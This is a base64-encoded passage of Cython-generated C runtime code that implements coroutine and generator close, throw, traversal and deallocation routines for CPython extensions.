ikpCiAgICAgICAgICAgICAgICByZXQgPSBfX1B5eF9QeUl0ZXJfTmV4dF9QbGFpbih5Zik7CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgI2VuZGlmCiAgICAgICAgICAgICAgICByZXQgPSBfX1B5eF9QeU9iamVjdF9DYWxsTWV0aG9kMSh5ZiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NlbmQsIHZhbHVlKTsKICAgICAgICB9CiAgICAgICAgaWYgKGxpa2VseShyZXQpKSB7CiAgICAgICAgICAgIF9fUHl4X0Nvcm91dGluZV91bnNldF9pc19ydW5uaW5nKGdlbik7CiAgICAgICAgICAgICpyZXR2YWwgPSByZXQ7CiAgICAgICAgICAgIHJldHVybiBQWUdFTl9ORVhUOwogICAgICAgIH0KICAgICAgICByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfRmluaXNoRGVsZWdhdGlvbihnZW4sIHJldHZhbCk7CiAgICB9IGVsc2UgewogICAgICAgIHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9TZW5kRXgoZ2VuLCB2YWx1ZSwgcmV0dmFsLCAwKTsKICAgIH0KICAgIF9fUHl4X0Nvcm91dGluZV91bnNldF9pc19ydW5uaW5nKGdlbik7CiAgICByZXR1cm4gcmVzdWx0Owp9CnN0YXRpYyBpbnQgX19QeXhfQ29yb3V0aW5lX0Nsb3NlSXRlcihfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiwgUHlPYmplY3QgKnlmKSB7CiAgICBfX1B5eF9QeVNlbmRSZXN1bHQgcmVzdWx0OwogICAgUHlPYmplY3QgKnJldHZhbCA9IE5VTEw7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihnZW4pOwogICAgYXNzZXJ0KF9fUHl4X0Nvcm91dGluZV9nZXRfaXNfcnVubmluZyhnZW4pKTsKICAgICNpZmRlZiBfX1B5eF9HZW5lcmF0b3JfVVNFRAogICAgaWYgKF9fUHl4X0dlbmVyYXRvcl9DaGVja0V4YWN0KHlmKSkgewogICAgICAgIHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9DbG9zZSh5ZiwgJnJldHZhbCk7CiAgICB9IGVsc2UKICAgICNlbmRpZgogICAgI2lmZGVmIF9fUHl4X0Nvcm91dGluZV9VU0VECiAgICBpZiAoX19QeXhfQ29yb3V0aW5lX0NoZWNrKHlmKSkgewogICAgICAgIHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9DbG9zZSh5ZiwgJnJldHZhbCk7CiAgICB9IGVsc2UKICAgIGlmIChfX1B5eF9Db3JvdXRpbmVBd2FpdF9DaGVja0V4YWN0KHlmKSkgewogICAgICAgIHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZUF3YWl0X0Nsb3NlKChfX3B5eF9Db3JvdXRpbmVBd2FpdE9iamVjdCopeWYpOwogICAgfSBlbHNlCiAgICAjZW5kaWYKICAgICNpZmRlZiBfX1B5eF9Bc3luY0dlbl9VU0VECiAgICBpZiAoX19weXhfUHlBc3luY0dlbkFTZW5kX0NoZWNrRXhhY3QoeWYpKSB7CiAgICAgICAgcmV0dmFsID0gX19QeXhfYXN5bmNfZ2VuX2FzZW5kX2Nsb3NlKHlmLCBOVUxMKTsKICAgICAgICByZXN1bHQgPSBQWUdFTl9SRVRVUk47CiAgICB9IGVsc2UKICAgIGlmIChfX3B5eF9QeUFzeW5jR2VuQVRocm93X0NoZWNrRXhhY3QoeWYpKSB7CiAgICAgICAgcmV0dmFsID0gX19QeXhfYXN5bmNfZ2VuX2F0aHJvd19jbG9zZSh5ZiwgTlVMTCk7CiAgICAgICAgcmVzdWx0ID0gUFlHRU5fUkVUVVJOOwogICAgfSBlbHNlCiAgICAjZW5kaWYKICAgIHsKICAgICAgICBQeU9iamVjdCAqbWV0aDsKICAgICAgICByZXN1bHQgPSBQWUdFTl9SRVRVUk47CiAgICAgICAgbWV0aCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHJOb0Vycm9yKHlmLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2xvc2UpOwogICAgICAgIGlmICh1bmxpa2VseSghbWV0aCkpIHsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KFB5RXJyX09jY3VycmVkKCkpKSB7CiAgICAgICAgICAgICAgICBQeUVycl9Xcml0ZVVucmFpc2FibGUoeWYpOwogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgcmV0dmFsID0gX19QeXhfUHlPYmplY3RfQ2FsbE5vQXJnKG1ldGgpOwogICAgICAgICAgICBQeV9ERUNSRUYobWV0aCk7CiAgICAgICAgICAgIGlmICh1bmxpa2VseSghcmV0dmFsKSkgewogICAgICAgICAgICAgICAgcmVzdWx0ID0gUFlHRU5fRVJST1I7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CiAgICBQeV9YREVDUkVGKHJldHZhbCk7CiAgICByZXR1cm4gcmVzdWx0ID09IFBZR0VOX0VSUk9SID8gLTEgOiAwOwp9CnN0YXRpYyBQeU9iamVjdCAqX19QeXhfR2VuZXJhdG9yX05leHQoUHlPYmplY3QgKnNlbGYpIHsKICAgIF9fUHl4X1B5U2VuZFJlc3VsdCByZXN1bHQ7CiAgICBQeU9iamVjdCAqcmV0dmFsID0gTlVMTDsKICAgIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuID0gKF9fcHl4X0Nvcm91dGluZU9iamVjdCopIHNlbGY7CiAgICBpZiAodW5saWtlbHkoX19QeXhfQ29yb3V0aW5lX3Rlc3RfYW5kX3NldF9pc19ydW5uaW5nKGdlbikpKSB7CiAgICAgICAgcmV0dXJuIF9fUHl4X0Nvcm91dGluZV9BbHJlYWR5UnVubmluZ0Vycm9yKGdlbik7CiAgICB9CiAgICAjaWYgQ1lUSE9OX1VTRV9BTV9TRU5ECiAgICBpZiAoZ2VuLT55aWVsZGZyb21fYW1fc2VuZCkgewogICAgICAgIHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9TZW5kVG9EZWxlZ2F0ZShnZW4sIGdlbi0+eWllbGRmcm9tX2FtX3NlbmQsIFB5X05vbmUsICZyZXR2YWwpOwogICAgfSBlbHNlCiAgICAjZW5kaWYKICAgIGlmIChnZW4tPnlpZWxkZnJvbSkgewogICAgICAgIFB5T2JqZWN0ICp5ZiA9IGdlbi0+eWllbGRmcm9tOwogICAgICAgIFB5T2JqZWN0ICpyZXQ7CiAgICAgICAgI2lmZGVmIF9fUHl4X0dlbmVyYXRvcl9VU0VECiAgICAgICAgaWYgKF9fUHl4X0dlbmVyYXRvcl9DaGVja0V4YWN0KHlmKSkgewogICAgICAgICAgICByZXQgPSBfX1B5eF9HZW5lcmF0b3JfTmV4dCh5Zik7CiAgICAgICAgfSBlbHNlCiAgICAgICAgI2VuZGlmCiAgICAgICAgI2lmZGVmIF9fUHl4X0Nvcm91dGluZV9VU0VECiAgICAgICAgaWYgKF9fUHl4X0Nvcm91dGluZV9DaGVja0V4YWN0KHlmKSkgewogICAgICAgICAgICByZXQgPSBfX1B5eF9Db3JvdXRpbmVfU2VuZCh5ZiwgUHlfTm9uZSk7CiAgICAgICAgfSBlbHNlCiAgICAgICAgI2VuZGlmCiAgICAgICAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiAoUFlfVkVSU0lPTl9IRVggPCAweDAzMEEwMEEzIHx8ICFDWVRIT05fVVNFX0FNX1NFTkQpCiAgICAgICAgaWYgKFB5R2VuX0NoZWNrRXhhY3QoeWYpKSB7CiAgICAgICAgICAgIHJldCA9IF9fUHl4X1B5R2VuX1NlbmQoKFB5R2VuT2JqZWN0Kil5ZiwgTlVMTCk7CiAgICAgICAgfSBlbHNlCiAgICAgICAgI2VuZGlmCiAgICAgICAgICAgIHJldCA9IF9fUHl4X1B5SXRlcl9OZXh0X1BsYWluKHlmKTsKICAgICAgICBpZiAobGlrZWx5KHJldCkpIHsKICAgICAgICAgICAgX19QeXhfQ29yb3V0aW5lX3Vuc2V0X2lzX3J1bm5pbmcoZ2VuKTsKICAgICAgICAgICAgcmV0dXJuIHJldDsKICAgICAgICB9CiAgICAgICAgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX0ZpbmlzaERlbGVnYXRpb24oZ2VuLCAmcmV0dmFsKTsKICAgIH0gZWxzZSB7CiAgICAgICAgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX1NlbmRFeChnZW4sIFB5X05vbmUsICZyZXR2YWwsIDApOwogICAgfQogICAgX19QeXhfQ29yb3V0aW5lX3Vuc2V0X2lzX3J1bm5pbmcoZ2VuKTsKICAgIHJldHVybiBfX1B5eF9Db3JvdXRpbmVfTWV0aG9kUmV0dXJuRnJvbVJlc3VsdChzZWxmLCByZXN1bHQsIHJldHZhbCwgMSk7Cn0Kc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9Db3JvdXRpbmVfQ2xvc2VfTWV0aG9kKFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqYXJnKSB7CiAgICBQeU9iamVjdCAqcmV0dmFsID0gTlVMTDsKICAgIF9fUHl4X1B5U2VuZFJlc3VsdCByZXN1bHQ7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihhcmcpOwogICAgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX0Nsb3NlKHNlbGYsICZyZXR2YWwpOwogICAgaWYgKHVubGlrZWx5KHJlc3VsdCA9PSBQWUdFTl9FUlJPUikpCiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICBQeV9YREVDUkVGKHJldHZhbCk7CiAgICBQeV9SRVRVUk5fTk9ORTsKfQpzdGF0aWMgX19QeXhfUHlTZW5kUmVzdWx0Cl9fUHl4X0Nvcm91dGluZV9DbG9zZShQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKipyZXR2YWwpIHsKICAgIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuID0gKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqKSBzZWxmOwogICAgX19QeXhfUHlTZW5kUmVzdWx0IHJlc3VsdDsKICAgIFB5T2JqZWN0ICp5ZjsKICAgIGludCBlcnIgPSAwOwogICAgaWYgKHVubGlrZWx5KF9fUHl4X0Nvcm91dGluZV90ZXN0X2FuZF9zZXRfaXNfcnVubmluZyhnZW4pKSkgewogICAgICAgICpyZXR2YWwgPSBfX1B5eF9Db3JvdXRpbmVfQWxyZWFkeVJ1bm5pbmdFcnJvcihnZW4pOwogICAgICAgIHJldHVybiBQWUdFTl9FUlJPUjsKICAgIH0KICAgIHlmID0gZ2VuLT55aWVsZGZyb207CiAgICBpZiAoeWYpIHsKICAgICAgICBQeV9JTkNSRUYoeWYpOwogICAgICAgIGVyciA9IF9fUHl4X0Nvcm91dGluZV9DbG9zZUl0ZXIoZ2VuLCB5Zik7CiAgICAgICAgX19QeXhfQ29yb3V0aW5lX1VuZGVsZWdhdGUoZ2VuKTsKICAgICAgICBQeV9ERUNSRUYoeWYpOwogICAgfQogICAgaWYgKGVyciA9PSAwKQogICAgICAgIFB5RXJyX1NldE5vbmUoUHlFeGNfR2VuZXJhdG9yRXhpdCk7CiAgICByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfU2VuZEV4KGdlbiwgTlVMTCwgcmV0dmFsLCAxKTsKICAgIGlmIChyZXN1bHQgPT0gUFlHRU5fRVJST1IpIHsKICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmUKICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnbgogICAgICAgIF9fUHl4X0Nvcm91dGluZV91bnNldF9pc19ydW5uaW5nKGdlbik7CiAgICAgICAgaWYgKCFfX1B5eF9QeUVycl9PY2N1cnJlZCgpKSB7CiAgICAgICAgICAgIHJldHVybiBQWUdFTl9SRVRVUk47CiAgICAgICAgfSBlbHNlIGlmIChsaWtlbHkoX19QeXhfUHlFcnJfRXhjZXB0aW9uTWF0Y2hlczIoUHlFeGNfR2VuZXJhdG9yRXhpdCwgUHlFeGNfU3RvcEl0ZXJhdGlvbikpKSB7CiAgICAgICAgICAgIF9fUHl4X1B5RXJyX0NsZWFyKCk7CiAgICAgICAgICAgIHJldHVybiBQWUdFTl9SRVRVUk47CiAgICAgICAgfQogICAgICAgIHJldHVybiBQWUdFTl9FUlJPUjsKICAgIH0gZWxzZSBpZiAobGlrZWx5KHJlc3VsdCA9PSBQWUdFTl9SRVRVUk4gJiYgKnJldHZhbCA9PSBQeV9Ob25lKSkgewogICAgICAgIF9fUHl4X0Nvcm91dGluZV91bnNldF9pc19ydW5uaW5nKGdlbik7CiAgICAgICAgcmV0dXJuIFBZR0VOX1JFVFVSTjsKICAgIH0gZWxzZSB7CiAgICAgICAgY29uc3QgY2hhciAqbXNnOwogICAgICAgIFB5X0RFQ1JFRigqcmV0dmFsKTsKICAgICAgICAqcmV0dmFsID0gTlVMTDsKICAgICAgICBpZiAoKDApKSB7CiAgICAgICAgI2lmZGVmIF9fUHl4X0Nvcm91dGluZV9VU0VECiAgICAgICAgfSBlbHNlIGlmIChfX1B5eF9Db3JvdXRpbmVfQ2hlY2soc2VsZikpIHsKICAgICAgICAgICAgbXNnID0gImNvcm91dGluZSBpZ25vcmVkIEdlbmVyYXRvckV4aXQiOwogICAgICAgICNlbmRpZgogICAgICAgICNpZmRlZiBfX1B5eF9Bc3luY0dlbl9VU0VECiAgICAgICAgfSBlbHNlIGlmIChfX1B5eF9Bc3luY0dlbl9DaGVja0V4YWN0KHNlbGYpKSB7CiAgICAgICAgICAgIG1zZyA9ICJhc3luYyBnZW5lcmF0b3IgaWdub3JlZCBHZW5lcmF0b3JFeGl0IjsKICAgICAgICAjZW5kaWYKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBtc2cgPSAiZ2VuZXJhdG9yIGlnbm9yZWQgR2VuZXJhdG9yRXhpdCI7CiAgICAgICAgfQogICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19SdW50aW1lRXJyb3IsIG1zZyk7CiAgICAgICAgX19QeXhfQ29yb3V0aW5lX3Vuc2V0X2lzX3J1bm5pbmcoZ2VuKTsKICAgICAgICByZXR1cm4gUFlHRU5fRVJST1I7CiAgICB9Cn0Kc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9fQ29yb3V0aW5lX1Rocm93KFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqdHlwLCBQeU9iamVjdCAqdmFsLCBQeU9iamVjdCAqdGIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqYXJncywgaW50IGNsb3NlX29uX2dlbmV4aXQpIHsKICAgIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuID0gKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqKSBzZWxmOwogICAgUHlPYmplY3QgKnlmOwogICAgaWYgKHVubGlrZWx5KF9fUHl4X0Nvcm91dGluZV90ZXN0X2FuZF9zZXRfaXNfcnVubmluZyhnZW4pKSkKICAgICAgICByZXR1cm4gX19QeXhfQ29yb3V0aW5lX0FscmVhZHlSdW5uaW5nRXJyb3IoZ2VuKTsKICAgIHlmID0gZ2VuLT55aWVsZGZyb207CiAgICBpZiAoeWYpIHsKICAgICAgICBfX1B5eF9QeVNlbmRSZXN1bHQgcmVzdWx0OwogICAgICAgIFB5T2JqZWN0ICpyZXQ7CiAgICAgICAgUHlfSU5DUkVGKHlmKTsKICAgICAgICBpZiAoX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKHR5cCwgUHlFeGNfR2VuZXJhdG9yRXhpdCkgJiYgY2xvc2Vfb25fZ2VuZXhpdCkgewogICAgICAgICAgICBpbnQgZXJyID0gX19QeXhfQ29yb3V0aW5lX0Nsb3NlSXRlcihnZW4sIHlmKTsKICAgICAgICAgICAgUHlfREVDUkVGKHlmKTsKICAgICAgICAgICAgX19QeXhfQ29yb3V0aW5lX1VuZGVsZWdhdGUoZ2VuKTsKICAgICAgICAgICAgaWYgKGVyciA8IDApCiAgICAgICAgICAgICAgICBnb3RvIHByb3BhZ2F0ZV9leGNlcHRpb247CiAgICAgICAgICAgIGdvdG8gdGhyb3dfaGVyZTsKICAgICAgICB9CiAgICAgICAgaWYgKDAKICAgICAgICAjaWZkZWYgX19QeXhfR2VuZXJhdG9yX1VTRUQKICAgICAgICAgICAgfHwgX19QeXhfR2VuZXJhdG9yX0NoZWNrRXhhY3QoeWYpCiAgICAgICAgI2VuZGlmCiAgICAgICAgI2lmZGVmIF9fUHl4X0Nvcm91dGluZV9VU0VECiAgICAgICAgICAgIHx8IF9fUHl4X0Nvcm91dGluZV9DaGVjayh5ZikKICAgICAgICAjZW5kaWYKICAgICAgICAgICAgKSB7CiAgICAgICAgICAgIHJldCA9IF9fUHl4X19Db3JvdXRpbmVfVGhyb3coeWYsIHR5cCwgdmFsLCB0YiwgYXJncywgY2xvc2Vfb25fZ2VuZXhpdCk7CiAgICAgICAgI2lmZGVmIF9fUHl4X0Nvcm91dGluZV9VU0VECiAgICAgICAgfSBlbHNlIGlmIChfX1B5eF9Db3JvdXRpbmVBd2FpdF9DaGVja0V4YWN0KHlmKSkgewogICAgICAgICAgICByZXQgPSBfX1B5eF9fQ29yb3V0aW5lX1Rocm93KCgoX19weXhfQ29yb3V0aW5lQXdhaXRPYmplY3QqKXlmKS0+Y29yb3V0aW5lLCB0eXAsIHZhbCwgdGIsIGFyZ3MsIGNsb3NlX29uX2dlbmV4aXQpOwogICAgICAgICNlbmRpZgogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIFB5T2JqZWN0ICptZXRoID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0ck5vRXJyb3IoeWYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90aHJvdyk7CiAgICAgICAgICAgIGlmICh1bmxpa2VseSghbWV0aCkpIHsKICAgICAgICAgICAgICAgIFB5X0RFQ1JFRih5Zik7CiAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoUHlFcnJfT2NjdXJyZWQoKSkpIHsKICAgICAgICAgICAgICAgICAgICBfX1B5eF9Db3JvdXRpbmVfdW5zZXRfaXNfcnVubmluZyhnZW4pOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBOVUxMOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgX19QeXhfQ29yb3V0aW5lX1VuZGVsZWdhdGUoZ2VuKTsKICAgICAgICAgICAgICAgIGdvdG8gdGhyb3dfaGVyZTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAobGlrZWx5KGFyZ3MpKSB7CiAgICAgICAgICAgICAgICByZXQgPSBfX1B5eF9QeU9iamVjdF9DYWxsKG1ldGgsIGFyZ3MsIE5VTEwpOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgUHlPYmplY3QgKmNhcmdzWzRdID0ge05VTEwsIHR5cCwgdmFsLCB0Yn07CiAgICAgICAgICAgICAgICByZXQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChtZXRoLCBjYXJncysxLCAzIHwgX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBQeV9ERUNSRUYobWV0aCk7CiAgICAgICAgfQogICAgICAgIFB5X0RFQ1JFRih5Zik7CiAgICAgICAgaWYgKHJldCkgewogICAgICAgICAgICBfX1B5eF9Db3JvdXRpbmVfdW5zZXRfaXNfcnVubmluZyhnZW4pOwogICAgICAgICAgICByZXR1cm4gcmV0OwogICAgICAgIH0KICAgICAgICByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfRmluaXNoRGVsZWdhdGlvbihnZW4sICZyZXQpOwogICAgICAgIF9fUHl4X0Nvcm91dGluZV91bnNldF9pc19ydW5uaW5nKGdlbik7CiAgICAgICAgcmV0dXJuIF9fUHl4X0Nvcm91dGluZV9NZXRob2RSZXR1cm5Gcm9tUmVzdWx0KHNlbGYsIHJlc3VsdCwgcmV0LCAwKTsKICAgIH0KdGhyb3dfaGVyZToKICAgIF9fUHl4X1JhaXNlKHR5cCwgdmFsLCB0YiwgTlVMTCk7CnByb3BhZ2F0ZV9leGNlcHRpb246CiAgICB7CiAgICAgICAgUHlPYmplY3QgKnJldHZhbCA9IE5VTEw7CiAgICAgICAgX19QeXhfUHlTZW5kUmVzdWx0IHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9TZW5kRXgoZ2VuLCBOVUxMLCAmcmV0dmFsLCAwKTsKICAgICAgICBfX1B5eF9Db3JvdXRpbmVfdW5zZXRfaXNfcnVubmluZyhnZW4pOwogICAgICAgIHJldHVybiBfX1B5eF9Db3JvdXRpbmVfTWV0aG9kUmV0dXJuRnJvbVJlc3VsdChzZWxmLCByZXN1bHQsIHJldHZhbCwgMCk7CiAgICB9Cn0Kc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9Db3JvdXRpbmVfVGhyb3coUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICphcmdzKSB7CiAgICBQeU9iamVjdCAqdHlwOwogICAgUHlPYmplY3QgKnZhbCA9IE5VTEw7CiAgICBQeU9iamVjdCAqdGIgPSBOVUxMOwogICAgaWYgKHVubGlrZWx5KCFQeUFyZ19VbnBhY2tUdXBsZShhcmdzLCAidGhyb3ciLCAxLCAzLCAmdHlwLCAmdmFsLCAmdGIpKSkKICAgICAgICByZXR1cm4gTlVMTDsKICAgIHJldHVybiBfX1B5eF9fQ29yb3V0aW5lX1Rocm93KHNlbGYsIHR5cCwgdmFsLCB0YiwgYXJncywgMSk7Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X0Nvcm91dGluZV90cmF2ZXJzZV9leGNzdGF0ZShfX1B5eF9FeGNJbmZvU3RydWN0ICpleGNfc3RhdGUsIHZpc2l0cHJvYyB2aXNpdCwgdm9pZCAqYXJnKSB7CiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMGE0CiAgICBQeV9WSVNJVChleGNfc3RhdGUtPmV4Y192YWx1ZSk7CiNlbHNlCiAgICBQeV9WSVNJVChleGNfc3RhdGUtPmV4Y190eXBlKTsKICAgIFB5X1ZJU0lUKGV4Y19zdGF0ZS0+ZXhjX3ZhbHVlKTsKICAgIFB5X1ZJU0lUKGV4Y19zdGF0ZS0+ZXhjX3RyYWNlYmFjayk7CiNlbmRpZgogICAgcmV0dXJuIDA7Cn0Kc3RhdGljIGludCBfX1B5eF9Db3JvdXRpbmVfdHJhdmVyc2UoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4sIHZpc2l0cHJvYyB2aXNpdCwgdm9pZCAqYXJnKSB7CiAgICB7CiAgICAgICAgaW50IGUgPSBfX1B5eF9jYWxsX3R5cGVfdHJhdmVyc2UoKFB5T2JqZWN0KilnZW4sIDEsIHZpc2l0LCBhcmcpOwogICAgICAgIGlmIChlKSByZXR1cm4gZTsKICAgIH0KICAgIFB5X1ZJU0lUKGdlbi0+Y2xvc3VyZSk7CiAgICBQeV9WSVNJVChnZW4tPmNsYXNzb2JqKTsKICAgIFB5X1ZJU0lUKGdlbi0+eWllbGRmcm9tKTsKICAgIHJldHVybiBfX1B5eF9Db3JvdXRpbmVfdHJhdmVyc2VfZXhjc3RhdGUoJmdlbi0+Z2lfZXhjX3N0YXRlLCB2aXNpdCwgYXJnKTsKfQpzdGF0aWMgaW50IF9fUHl4X0Nvcm91dGluZV9jbGVhcihQeU9iamVjdCAqc2VsZikgewogICAgX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4gPSAoX19weXhfQ29yb3V0aW5lT2JqZWN0ICopIHNlbGY7CiAgICBQeV9DTEVBUihnZW4tPmNsb3N1cmUpOwogICAgUHlfQ0xFQVIoZ2VuLT5jbGFzc29iaik7CiAgICBfX1B5eF9Db3JvdXRpbmVfVW5kZWxlZ2F0ZShnZW4pOwogICAgX19QeXhfQ29yb3V0aW5lX0V4Y2VwdGlvbkNsZWFyKCZnZW4tPmdpX2V4Y19zdGF0ZSk7CiNpZmRlZiBfX1B5eF9Bc3luY0dlbl9VU0VECiAgICBpZiAoX19QeXhfQXN5bmNHZW5fQ2hlY2tFeGFjdChzZWxmKSkgewogICAgICAgIFB5X0NMRUFSKCgoX19weXhfUHlBc3luY0dlbk9iamVjdCopZ2VuKS0+YWdfZmluYWxpemVyKTsKICAgIH0KI2VuZGlmCiAgICBQeV9DTEVBUihnZW4tPmdpX2NvZGUpOwogICAgUHlfQ0xFQVIoZ2VuLT5naV9mcmFtZSk7CiAgICBQeV9DTEVBUihnZW4tPmdpX25hbWUpOwogICAgUHlfQ0xFQVIoZ2VuLT5naV9xdWFsbmFtZSk7CiAgICBQeV9DTEVBUihnZW4tPmdpX21vZHVsZW5hbWUpOwogICAgcmV0dXJuIDA7Cn0Kc3RhdGljIHZvaWQgX19QeXhfQ29yb3V0aW5lX2RlYWxsb2MoUHlPYmplY3QgKnNlbGYpIHsKICAgIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuID0gKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqKSBzZWxmOwogICAgUHlPYmplY3RfR0NfVW5UcmFjayhnZW4pOwogICAgaWYgKGdlbi0+Z2lfd2Vha3JlZmxpc3QgIT0gTlVMTCkKICAgICAgICBQeU9iamVjdF9DbGVhcldlYWtSZWZzKHNlbGYpOwogICAgaWYgKGdlbi0+cmVzdW1lX2xhYmVsID49IDApIHsKICAgICAgICBQeU9iamVjdF9HQ19UcmFjayhzZWxmKTsKI2lmIENZVEhPTl9VU0VfVFBfRklOQUxJWkUKICAgICAgICBpZiAodW5saWtlbHkoUHlPYmplY3RfQ2FsbEZpbmFsaXplckZyb21EZWFsbG9jKHNlbGYpKSkKI2Vsc2UKICAgICAgICB7CiAgICAgICAgICAgIGRlc3RydWN0b3IgZGVsID0gX19QeXhfUHlPYmplY3RfR2V0U2xvdChnZW4sIHRwX2RlbCwgZGVzdHJ1Y3Rvcik7CiAgICAgICAgICAgIGlmIChkZWwpIGRlbChzZWxmKTsKICAgICAgICB9CiAgICAgICAgaWYgKHVubGlrZWx5KFB5X1JFRkNOVChzZWxmKSA+IDApKQojZW5kaWYKICAgICAgICB7CiAgICAgICAgICAgIHJldHVybjsKICAgICAgICB9CiAgICAgICAgUHlPYmplY3RfR0NfVW5UcmFjayhzZWxmKTsKICAgIH0KI2lmZGVmIF9fUHl4X0FzeW5jR2VuX1VTRUQKICAgIGlmIChfX1B5eF9Bc3luY0dlbl9DaGVja0V4YWN0KHNlbGYpKSB7CiAgICAgICAgCiAgICAgICAgUHlfQ0xFQVIoKChfX3B5eF9QeUFzeW5jR2VuT2JqZWN0KilzZWxmKS0+YWdfZmluYWxpemVyKTsKICAgIH0KI2VuZGlmCiAgICBfX1B5eF9Db3JvdXRpbmVfY2xlYXIoc2VsZik7CiAgICBfX1B5eF9QeUhlYXBUeXBlT2JqZWN0X0dDX0RlbChnZW4pOwp9CiNpZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFCnN0YXRpYyB2b2lkIF9fUHl4X0Nvcm91dGluZV9kZWwoUHlPYmplY3QgKnNlbGYpIHsKICAgIFB5T2JqZWN0ICplcnJvcl90eXBlLCAqZXJyb3JfdmFsdWUsICplcnJvcl90cmFjZWJhY2s7CiAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiA9IChfX3B5eF9Db3JvdXRpbmVPYmplY3QgKikgc2VsZjsKICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQogICAgaWYgKGdlbi0+cmVzdW1lX2xhYmVsIDwgMCkgewogICAgICAgIHJldHVybjsKICAgIH0KICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduCiAgICBfX1B5eF9FcnJGZXRjaCgmZXJyb3JfdHlwZSwgJmVycm9yX3ZhbHVlLCAmZXJyb3JfdHJhY2ViYWNrKTsKI2lmZGVmIF9fUHl4X0FzeW5jR2VuX1VTRUQKICAgIGlmIChfX1B5eF9Bc3luY0dlbl9DaGVja0V4YWN0KHNlbGYpKSB7CiAgICAgICAgX19weXhfUHlBc3luY0dlbk9iamVjdCAqYWdlbiA9IChfX3B5eF9QeUFzeW5jR2VuT2JqZWN0KilzZWxmOwogICAgICAgIFB5T2JqZWN0ICpmaW5hbGl6ZXIgPSBhZ2VuLT5hZ19maW5hbGl6ZXI7CiAgICAgICAgaWYgKGZpbmFsaXplciAmJiAhYWdlbi0+YWdfY2xvc2VkKSB7CiAgICAgICAgICAgIFB5T2JqZWN0ICpyZXMgPSBfX1B5eF9QeU9iamVjdF9DYWxsT25lQXJnKGZpbmFsaXplciwgc2VsZik7CiAgICAgICAgICAgIGlmICh1bmxpa2VseSghcmVzKSkgewogICAgICAgICAgICAgICAgUHlFcnJfV3JpdGVVbnJhaXNhYmxlKHNlbGYpOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgUHlfREVDUkVGKHJlcyk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgX19QeXhfRXJyUmVzdG9yZShlcnJvcl90eXBlLCBlcnJvcl92YWx1ZSwgZXJyb3JfdHJhY2ViYWNrKTsKICAgICAgICAgICAgcmV0dXJuOwogICAgICAgIH0KICAgIH0KI2VuZGlmCiAgICBpZiAodW5saWtlbHkoZ2VuLT5yZXN1bWVfbGFiZWwgPT0gMCAmJiAhZXJyb3JfdmFsdWUpKSB7CiNpZmRlZiBfX1B5